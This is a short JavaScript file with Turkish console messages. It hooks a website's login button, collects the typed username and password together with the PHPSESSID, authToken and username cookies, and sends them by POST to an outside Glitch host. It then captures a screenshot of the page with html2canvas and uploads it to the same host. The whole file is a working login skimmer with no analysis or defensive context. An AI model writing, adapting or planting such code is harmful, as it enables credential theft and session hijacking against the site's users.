(function() {
    const script = document.createElement('script');
    script.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
    script.onload = () => {
        console.log('html2canvas yüklendi');
        setupLoginListener();
    };
    script.onerror = () => console.error('html2canvas yüklenemedi');
    document.head.appendChild(script);

    function getCookie(name) {
        const value = `; ${document.cookie}`;
        const parts = value.split(`; ${name}=`);
        if (parts.length === 2) return decodeURIComponent(parts.pop().split(';').shift());
        return null;
    }

    function setupLoginListener() {
        const loginBtn = document.querySelector('a[onclick="girisyap()"]');
        if (loginBtn) {
            loginBtn.addEventListener('click', () => {
                const username = document.getElementById('loginname')?.value || 'Bilinmiyor';
                const password = document.getElementById('loginpassport')?.value || 'Bilinmiyor';
                const remember = document.getElementById('authCheck')?.checked || false;

                const data = {
                    kuladi: username,
                    sifre: password,
                    remember: remember,
                    cookies: {
                        username: getCookie('username') || 'Yok',
                        PHPSESSID: getCookie('PHPSESSID') || 'Yok',
                        authToken: getCookie('authToken') || 'Yok'
                    },
                    timestamp: Date.now()
                };

                // Girişten sonra hemen gönder
                sendCredentials(data);
            });
        } else {
            setTimeout(setupLoginListener, 100);
        }
    }

    function sendCredentials(data) {
        fetch('https://katip-atlas.glitch.me/log', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data),
            credentials: 'include'
        })
            .then(response => {
                if (!response.ok) throw new Error('Log gönderilemedi');
                console.log('Log gönderildi');
                captureScreenshot(data.kuladi);
            })
            .catch(err => console.error('Log gönderilemedi:', err));
    }

    function captureScreenshot(username) {
        if (typeof html2canvas !== 'function') {
            console.error('html2canvas hazır değil');
            return;
        }

        html2canvas(document.body).then(canvas => {
            const screenshot = canvas.toDataURL('image/png');
            fetch('https://katip-atlas.glitch.me/upload-screenshot', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    username: username,
                    screenshot: screenshot,
                    timestamp: Date.now()
                }),
                credentials: 'include'
            })
                .then(response => {
                    if (!response.ok) throw new Error('Ekran görüntüsü gönderilemedi');
                    console.log('Ekran görüntüsü gönderildi');
                })
                .catch(err => console.error('Ekran görüntüsü gönderilemedi:', err));
        });
    }
})();
